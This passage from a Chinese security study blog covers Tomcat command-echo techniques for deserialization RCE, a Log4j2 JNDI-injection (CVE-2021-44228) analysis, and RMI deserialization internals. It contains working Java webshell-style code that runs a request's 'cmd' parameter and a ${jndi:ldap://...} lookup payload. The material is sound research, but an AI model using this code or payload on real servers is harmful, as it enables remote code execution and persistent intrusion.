&#125;</span><br></pre></td></tr></table></figure><p>​假设我们有个能RCE的反序列化点，就可以这样做：第一次请求时，先将WRAP_SAME_OBJECT属性设置为true；第二次请求时，线程自动将request对象和response对象缓存在lastServicedRequest、lastServicedResponse上，通过反射从这两个ThreadLocal变量上获取到request对象和response对象，执行命令，并将返回结果写到response对象的输出流。</p><p>1.通过反射修改final类型变量WRAP_SAME_OBJECT、lastServicedRequest、lastServicedResponse，设置权限。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">WRAP_SAME_OBJECT_FIELD</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>).getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">lastServicedRequestField</span> <span class="operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">lastServicedResponseField</span> <span class="operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">modifiersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">WRAP_SAME_OBJECT_FIELD.setAccessible(<span class="literal">true</span>);</span><br><span class="line">lastServicedRequestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">lastServicedResponseField.setAccessible(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>2.获取WRAP_SAME_OBJECT、lastServicedRequest、lastServicedResponse变量的情况，检查是否需要修改</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ThreadLocal&lt;ServletResponse&gt; lastServicedResponse =</span><br><span class="line">    (ThreadLocal&lt;ServletResponse&gt;) lastServicedResponseField.get(<span class="literal">null</span>);</span><br><span class="line">ThreadLocal&lt;ServletRequest&gt; lastServicedRequest = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequestField.get(<span class="literal">null</span>);</span><br><span class="line"><span class="type">boolean</span> <span class="variable">WRAP_SAME_OBJECT</span> <span class="operator">=</span> WRAP_SAME_OBJECT_FIELD.getBoolean(<span class="literal">null</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> lastServicedRequest != <span class="literal">null</span>? lastServicedRequest.get().getParameter(<span class="string">&quot;cmd&quot;</span>): <span class="literal">null</span>;</span><br></pre></td></tr></table></figure><p>3.设置WRAP_SAME_OBJECT、lastServicedRequest、lastServicedResponse变量，或者，执行命令并回显。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!WRAP_SAME_OBJECT || lastServicedResponse == <span class="literal">null</span> || lastServicedRequest == <span class="literal">null</span>) &#123;</span><br><span class="line">    lastServicedRequestField.set(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;());</span><br><span class="line">    lastServicedResponseField.set(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;());</span><br><span class="line">    WRAP_SAME_OBJECT_FIELD.setBoolean(<span class="literal">null</span>, <span class="literal">true</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="comment">//获取response对象，及其输出流</span></span><br><span class="line">    <span class="type">ServletResponse</span> <span class="variable">responseFacade</span> <span class="operator">=</span> lastServicedResponse.get();</span><br><span class="line">    responseFacade.getWriter();</span><br><span class="line">    java.io.<span class="type">Writer</span> <span class="variable">w</span> <span class="operator">=</span> responseFacade.getWriter();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">responseField</span> <span class="operator">=</span> ResponseFacade.class.getDeclaredField(<span class="string">&quot;response&quot;</span>);</span><br><span class="line">    responseField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> (Response) responseField.get(responseFacade);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">usingWriter</span> <span class="operator">=</span> Response.class.getDeclaredField(<span class="string">&quot;usingWriter&quot;</span>);</span><br><span class="line">    usingWriter.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    usingWriter.set((Object) response, Boolean.FALSE);</span><br><span class="line"><span class="comment">//执行命令并写入结果</span></span><br><span class="line"><span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">        isLinux = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">    <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">    w.write(output);</span><br><span class="line">    w.flush();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="修改final类型变量的通式"><a href="#修改final类型变量的通式" class="headerlink" title="修改final类型变量的通式"></a>修改final类型变量的通式</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获取变量</span></span><br><span class="line">Field WRAP_SAME_OBJECT_FIELD=Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>).getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);</span><br><span class="line"><span class="comment">//设置权限                                           </span></span><br><span class="line"><span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">modifiersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">modifiersField.setInt(WRAP_SAME_OBJECT_FIELD,WRAP_SAME_OBJECT_FIELD.getModifiers()&amp;~Modifier.FINAL);</span><br><span class="line">WRAP_SAME_OBJECT_FIELD.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//修改变量值</span></span><br><span class="line">WRAP_SAME_OBJECT_FIELD.setBoolean(<span class="literal">null</span>, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure><h4 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h4><p>​shiro的rememberMe功能，其实是shiro自己实现的一个filter，在filter.doFilter中执行。而ApplicationFilterChain类的internalDoFilter方法，是先filter.doFilter，再缓存request对象和response对象。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">if</span> (<span class="built_in">this</span>.pos &lt; <span class="built_in">this</span>.n) &#123;</span><br><span class="line">filter.doFilter(request, response, <span class="built_in">this</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     <span class="keyword">if</span> (ApplicationDispatcher.WRAP_SAME_OBJECT) &#123;</span><br><span class="line">         lastServicedRequest.set(request);</span><br><span class="line">         lastServicedResponse.set(response);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h3 id="threedr3am-师傅之-AddFilter-动态注入"><a href="#threedr3am-师傅之-AddFilter-动态注入" class="headerlink" title="threedr3am 师傅之 AddFilter 动态注入"></a>threedr3am 师傅之 AddFilter 动态注入</h3><p>​通过Filter型内存马的研究，我们知道获取到request对象后，就能获取到web应用的上下文信息StandardContext对象，将恶意filter对象的信息注册到FilterDefs、filterMaps和filterConfigs，从而实现内存马。通过ApplicationFilterChain类的internalDoFilter方法可以缓存request对象，并在反序列化点通过反射获取，从而能在第二次请求时实现注入Filter型内存马。其实，就是后续命令执行和回显不再通过反序列化点了，而是一个恶意filter。</p><p>​注意，调用StandardContext对象的api注册filter信息时，可能会遇到生命周期问题抛出异常，反射修改相关属性即可。</p><h3 id="Litch1-师傅-之-Tomcat-通用回显（K-O-shiro550）"><a href="#Litch1-师傅-之-Tomcat-通用回显（K-O-shiro550）" class="headerlink" title="Litch1 师傅 之 Tomcat 通用回显（K.O. shiro550）"></a>Litch1 师傅 之 Tomcat 通用回显（K.O. shiro550）</h3><p>​Tomcat 启动后会创建Http11Processor对象，其继承AbstractProcessor类，AbstractProcessor构造函数中，会通过传递的参数初始化 request 和 response 属性。问题转化为如何确定Http11Processor对象的位置？</p><p>​后续对Http11Processor对象的处理逻辑中，可以看到将Http11Processor对象的RequestInfo属性存储到其他类里，我们可以归纳出这样一条存储位置信息:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">protocolHandler（AbstractProtocol）-&gt; ConnectionHandler-&gt;RequestGroupInfo-&gt;RequestInfo-&gt;req-&gt;response</span><br></pre></td></tr></table></figure><p>​如果从当前线程的反序列化点位置，能获取到的类分析，我们可以找到完整的利用链：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">webappClassLoaderBase（Thread.currentThread().getContextClassLoader()）-&gt;StandardService-&gt;Connector</span><br><span class="line">-&gt;protocolHandler（AbstractProtocol）-&gt; ConnectionHandler-&gt;RequestGroupInfo-&gt;RequestInfo-&gt;req-&gt;response</span><br></pre></td></tr></table></figure><p>​从这点来看，Requst、ServletRequest、RequstGroup、RequestInfo、RequestGroupInfo类都是能到达request对象的位置，因此内存马的挖掘要从这里考虑。</p><h3 id="c0ny1-师傅-之-java-object-searcher"><a href="#c0ny1-师傅-之-java-object-searcher" class="headerlink" title="c0ny1 师傅 之 java-object-searcher"></a><strong>c0ny1 师傅 之 java-object-searcher</strong></h3><p>第一步：寻找存储有 request 对象的全局变量</p><p>第二步：半自动化反射搜索全局变量</p><p>​实现技巧为：限制挖掘深度、设置黑名单、搜索继承的所有属性、推荐使用广度优先算法而不是深度优先。</p><h3 id="李三师傅之MBeanServer"><a href="#李三师傅之MBeanServer" class="headerlink" title="李三师傅之MBeanServer"></a>李三师傅之MBeanServer</h3><p>​在 tomcat7+shiro 环境下，因为，tomcat7 的 webappClassLoaderBase 对象的 resources属 性 下 并 没 有 applicationContext 对象，继而无法获取StandardService对象 、StandardContext对象等，所以，Litch1 师傅的方法在这种环境下行不通。李三师傅找到了这种环境下的反射链：<a href="https://xz.aliyun.com/t/7535%E3%80%82">https://xz.aliyun.com/t/7535。</a></p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复习篇 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Log4j2漏洞分析</title>
      <link href="/2023/03/20/Log4j2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2023/03/20/Log4j2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="Log4j2"><a href="#Log4j2" class="headerlink" title="Log4j2"></a>Log4j2</h1><blockquote><p><a href="https://www.cnpanda.net/sec/1114.html">https://www.cnpanda.net/sec/1114.html</a></p></blockquote><h3 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//影响范围：版本处于2.x &lt; 2.15.0-rc2的 Apache log4j-core的应用项目或组件</span></span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">2.12</span><span class="number">.1</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">2.12</span><span class="number">.1</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h3 id="执行环境"><a href="#执行环境" class="headerlink" title="执行环境"></a>执行环境</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//CVE-2021-44228</span></span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">log4j2</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger();</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">//        logger.error(&quot;$&#123;jndi:rmi://127.0.0.1:1099/obj&#125;&quot;);</span></span><br><span class="line">        logger.error(<span class="string">&quot;$&#123;jndi:ldap://127.0.0.1:7777/test&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>​Log4j2的Lookups功能，提供了一种在任意位置向Log4j配置添加值的方法，支持添加base64<code>、</code>data<code>、</code>ctx<code>、</code>main<code>、</code>env<code>、</code>sys<code>、</code>sd<code>、</code>java<code>、</code>marker<code>、</code>jndi<code>、</code>jvmrunargs<code>、</code>map<code>、</code>bundle<code>、</code>log4j等内容。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//https://logging.apache.org/log4j/2.x/manual/configuration.html</span></span><br><span class="line">logger.error(<span class="string">&quot;$&#123;java:runtime&#125;&quot;</span>);</span><br><span class="line">logger.error(<span class="string">&quot;$&#123;base64:SGVsbG8gV29ybGQhCg==&#125;&quot;</span>);</span><br></pre></td></tr></table></figure><p>​Log4j2安全漏洞，底层sink点是JNDI+RMI、JNDI+LDAP远程加载恶意类，需要找到通往JNDI lookup的调用栈。我们找到Log4j2处理JNDI查询的<strong>JndiLookup类</strong>，在其lookup方法上打下断点，后续调用JndiManager.lookup，实现JNDI远程加载Reference类。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//JndiManager.lookup方法 context为new InitialContext()</span></span><br><span class="line"><span class="keyword">public</span> &lt;T&gt; T <span class="title function_">lookup</span><span class="params">(String name)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.context.lookup(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​接下来关注Log4j2的解析机制，如何判断字符串里要去做jndi查询。在MessagePatternConverter类的 format方法，workingBuilder中存储的是日志信息，如果workingBuilder遇到<code>$</code>字符后跟了一个<code>&#123;</code>字符，那么会对直到<code>&#125;</code>中间的内容进行解析并replace。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//workingBuilder值为：</span></span><br><span class="line"><span class="comment">//16:29:22.423 [main] ERROR com.bmsk.Log4j2.log4j2 - $&#123;jndi:rmi://127.0.0.1:1099/obj&#125;</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.config != <span class="literal">null</span> &amp;&amp; !<span class="built_in">this</span>.noLookups) &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> offset; i &lt; workingBuilder.length() - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (workingBuilder.charAt(i) == <span class="string">&#x27;$&#x27;</span> &amp;&amp; workingBuilder.charAt(i + <span class="number">1</span>) == <span class="string">&#x27;&#123;&#x27;</span>) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> workingBuilder.substring(offset, workingBuilder.length());</span><br><span class="line">           <span class="comment">//value为$&#123;jndi:rmi://127.0.0.1:1099/obj&#125;</span></span><br><span class="line">            workingBuilder.setLength(offset);</span><br><span class="line">            <span class="comment">//offest为51，就是51以后的$&#123;&#125;可覆盖了，此时toString也只会输出到51，append会从51开始</span></span><br><span class="line">            workingBuilder.append(<span class="built_in">this</span>.config.getStrSubstitutor().replace(event, value));</span><br><span class="line">            <span class="comment">//替换$&#123;&#125;中间的内容，保留&#125;后面的内容，从最先遇到的&#125;结束</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​总结一下，就是遇到字符串中的${}，这个位置就是个查询，需要把中间包括的内容解析出来，用解析结果替换掉原来的查询字符串。解析“${}”开始位置是MessagePatternConverter类的format方法，最终到initialContext#lookup方法，调用链如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">lookup:<span class="number">172</span>, JndiManager (org.apache.logging.log4j.core.net)<span class="comment">//执行JNDI查询，远程加载Reference类</span></span><br><span class="line">lookup:<span class="number">56</span>, JndiLookup (org.apache.logging.log4j.core.lookup)</span><br><span class="line">lookup:<span class="number">198</span>, Interpolator (org.apache.logging.log4j.core.lookup)<span class="comment">//Log4j2根据中间的内容，判断出是JNDI查询</span></span><br><span class="line">resolveVariable:<span class="number">1060</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">substitute:<span class="number">982</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">substitute:<span class="number">878</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">replace:<span class="number">433</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">format:<span class="number">132</span>, MessagePatternConverter (org.apache.logging.log4j.core.pattern)<span class="comment">//开始处理$&#123;&#125;的位置</span></span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F;修复绕过？？？DDOS到RCE???</p><p>&#x2F;&#x2F;软件供应链0day，应急响应的部署？？？</p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复习篇 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RMI</title>
      <link href="/2023/03/20/RMI/"/>
      <url>/2023/03/20/RMI/</url>
      
        <content type="html"><![CDATA[<h1 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>​RMI，Java Remote Method Invocation，Java远程方法调用。它的目标和RPC类似，是让某个JVM的对象调用另一个JVM的对象。调用远程对象方法期间，JVM可能需要加载不在本地CLASSPATH的类，需要对方法参数和返回值进行序列化与反序列化，这就发生了安全问题。</p><p>​JRMP，Java Remote Method Protocol，Java远程方法协议。JRMP协议用于RMI过程中，传输的数据包包含Java原生序列化数据，通信双方均存在序列化与反序列化过程，发生了安全问题。</p><p>​JNDI，Java Naming and Directory Interface，Java命名和目录接口。既然是接口，就是一种被规范的标准，对行为的抽象。JNDI抽象的是通过资源名查找资源的行为，底层可以是通过RMI查找一个Java远程对象，也可以是通过DNS查找一个域名。</p><p>​LDAP，Lightweight Directory Access Protocol，轻型目录访问协议。在我看来就是目录数据库，用来保存描述性的、基于属性的详细信息。LDAP服务器能保存Java类，能够通过JNDI访问。</p><h2 id="网络通信"><a href="#网络通信" class="headerlink" title="网络通信"></a>网络通信</h2><blockquote><p><a href="https://xz.aliyun.com/t/7079#toc-3">https://xz.aliyun.com/t/7079#toc-3</a></p></blockquote><h3 id="RMI实验Demo"><a href="#RMI实验Demo" class="headerlink" title="RMI实验Demo"></a>RMI实验Demo</h3><p>1.远程方法</p><p>​RMI客户端和服务端，都有HelloService接口，使得客户端知道能调用哪些方法，该接口需要<strong>继承Remote接口</strong>。RMI服务端的HelloServiceImpl类实现HelloService接口（注意package名一致），且需要<strong>继承UnicastRemoteObject类</strong>。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">HelloService</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    String <span class="title function_">sayHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServiceImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">HelloService</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">HelloServiceImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.RMI服务端</p><p>​RMI服务端启动一个RMI注册中心，将HelloServiceImpl实例绑定到RMI注册中心。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">      registry.bind(<span class="string">&quot;hello&quot;</span>, <span class="keyword">new</span> <span class="title class_">HelloServiceImpl</span>());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (AlreadyBoundException e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.RMI客户端</p><p>​另一个JVM上的RMI客户端，获取前面启动的RMI注册中心，查询远程对象，并调用远程方法。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">            <span class="type">HelloService</span> <span class="variable">helloService</span> <span class="operator">=</span> (HelloService) registry.lookup(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">            System.out.println(helloService.sayHello());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NotBoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="描述整体过程"><a href="#描述整体过程" class="headerlink" title="描述整体过程"></a>描述整体过程</h3><ol><li>RMI服务端启动时，启动了一个RMI注册中心，将HelloServiceImpl实例的stub数据绑定到RMI注册中心。</li><li>RMI客户端启动时，通过给定网络地址构造RMI注册中心的stub对象，通过stub对象连接注册中心。从注册中心获取到远程实例的stub对象，将其处理成HelloService接口的动态代理。</li><li>RMI客户端调用HelloService代理类的方法时，会调用RemoteObjectInvocationHandler的invoke方法，其中将客户端传参序列化，远程方法执行后，将服务端返回的结构反序列化。</li></ol><p>​RMI整个过程中，客户端、服务端和注册中心都发生了通信，支撑通信的时stub对象（请求）和skeleton对象（监听请求），其中包含Socket端口等信息。我们可以调试代码，理解序列化和通信过程，通信都是stub或skeleton对象的UnicastRef属性去建立Connection连接，发送序列化信息等。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//注册中心LocateRegistry.createRegistry(1099)</span></span><br><span class="line"><span class="comment">//RegistryImpl[UnicastServerRef [liveRef: [endpoint:[169.254.34.44:1099](local),objID:[0:0:0, 0]]]]</span></span><br><span class="line">createRegistry会返回一个Registry对象，这是RMI注册中心的skeleton对象，用于注册中心接受客户端或服务端请求。</span><br><span class="line"></span><br><span class="line"><span class="comment">//客户端和服务端LocateRegistry.getRegistry(&quot;127.0.0.1&quot;,1099)</span></span><br><span class="line"><span class="comment">//RegistryImpl_Stub[UnicastRef [liveRef: [endpoint:[127.0.0.1:1099](remote),objID:[0:0:0, 0]]]]</span></span><br><span class="line"><span class="keyword">return</span> createStub(var3, var1);</span><br><span class="line">getRegistry会返回一个Registry对象（如上所示，RegistryImpl_Stub，指向RMI注册中心）。因为已知ip和port，这是RMI客户端或者RMI服务端，在本地自己制造出来的RMI注册中心的stub对象，用于向注册中心发送请求。</span><br><span class="line"> </span><br><span class="line"><span class="comment">//服务端registry.bind(&quot;hello&quot;, new HelloServiceImpl())</span></span><br><span class="line">如果服务端和注册中心分离，这里registry就是注册中心stub对象。在bind方法中，出现如下代码，是将“hello”字符串和HelloServiceImpl实例的stub对象序列化，发送给注册中心。应该也同时创建HelloServiceImpl实例的skeleton对象获取客户端请求。</span><br><span class="line">    <span class="type">ObjectOutput</span> <span class="variable">var4</span> <span class="operator">=</span> var3.getOutputStream();</span><br><span class="line">    var4.writeObject(var1);</span><br><span class="line">    var4.writeObject(var2);</span><br><span class="line">    <span class="built_in">super</span>.ref.invoke(var3);</span><br><span class="line"></span><br><span class="line"><span class="comment">//客户端HelloService helloService = (HelloService) registry.lookup(&quot;hello&quot;);</span></span><br><span class="line">RMI客户端向RMI注册中心，请求HelloServiceImpl实例的stub对象，在lookup方法中，出现如下代码，是将“hello”字符串序列化，发送给注册中心。（不知道为啥，RegistryImpl_Stub类的方法都调试不了）</span><br><span class="line"><span class="type">ObjectOutput</span> <span class="variable">var3</span> <span class="operator">=</span> var2.getOutputStream();</span><br><span class="line">var3.writeObject(var1);<span class="comment">//序列化查询的“hello”</span></span><br><span class="line"><span class="built_in">super</span>.ref.invoke(var2);</span><br><span class="line"><span class="type">ObjectInput</span> <span class="variable">var6</span> <span class="operator">=</span> var2.getInputStream();</span><br><span class="line">var23 = (Remote)var6.readObject();<span class="comment">//反序列化返回的stub对象</span></span><br><span class="line">返回HelloService的代理对象，其InvocationHandler为RemoteObjectInvocationHandler.invoke，其invoke方法，实现了通过stub与RMI服务端通信。</span><br><span class="line"></span><br><span class="line"><span class="comment">//客户端helloService.sayHello</span></span><br><span class="line"><span class="comment">//Proxy[HelloService,RemoteObjectInvocationHandler[UnicastRef [liveRef: [endpoint:[169.254.34.44:12608](remote),objID:[66efc230:186bfd76e21:-7fff, 4244828572917269603]]]]]</span></span><br><span class="line">当执行helloService.sayHello时，因为动态代理的原因，会调用RemoteObjectInvocationHandler.invoke方法，该方法通过stub实现远程方法调用。内部存在如下逻辑，对方法传参的序列化、远程执行方法、反序列化返回结果。</span><br><span class="line">marshalValue((Class)((Object[])var11)[var12], var3[var12], var10);<span class="comment">//序列化传参，内部writeObject</span></span><br><span class="line">var7.executeCall();<span class="comment">//远程方法执行</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">var50</span> <span class="operator">=</span> unmarshalValue(var49, (ObjectInput)var11);<span class="comment">//反序列化返回结果，内部readObject</span></span><br></pre></td></tr></table></figure><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>​分析RMI的整体过程后，我们能看到其中有很多反序列化点，可以把它们提取出来。</p><h3 id="服务端打注册中心"><a href="#服务端打注册中心" class="headerlink" title="服务端打注册中心"></a>服务端打注册中心</h3><p>​<strong>registry.bind(“hello”, new HelloServiceImpl())</strong> </p><p>​注册中心stub对象registry，进行bind时，会将“hello”字符串和helloServiceImpl实例序列化，那么，注册中心skeleton对象会对这两个字节序列反序列化。注意，bind方法的第二个参数，需要是Remote接口的实现类。这里有一种适合各种序列化点的Gadget，具体POC见<a 